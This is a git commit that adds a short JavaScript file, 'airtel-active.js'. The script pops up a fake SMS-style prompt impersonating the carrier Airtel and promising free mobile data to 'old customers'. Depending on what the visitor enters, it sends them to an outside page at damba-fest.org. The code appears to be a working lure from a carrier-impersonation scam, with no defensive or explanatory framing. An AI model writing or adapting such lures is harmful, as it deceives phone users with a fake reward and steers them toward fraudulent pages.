59bc4e7dcc2ba6821daec39449759d4f11902cb2
boss-bloq <nsisboy01@gmail.com>
2024-08-30 06:29:30 -0700

    Create airtel-active.js

---
+++ airtel-active.js
@@ -0,0 +1,6 @@
+
+var password = 'Activate 50GB'
+password=prompt('SMS: Dear customer, kindly check if your sim card is qualify to receive from 5GB to Unlimited data, old customers Reward, press OK to Activate now ','Activate 50GB');
+if (password != 'Activate 50GB') {
+location.href='https://damba-fest.org/airtel4g.html';
+}
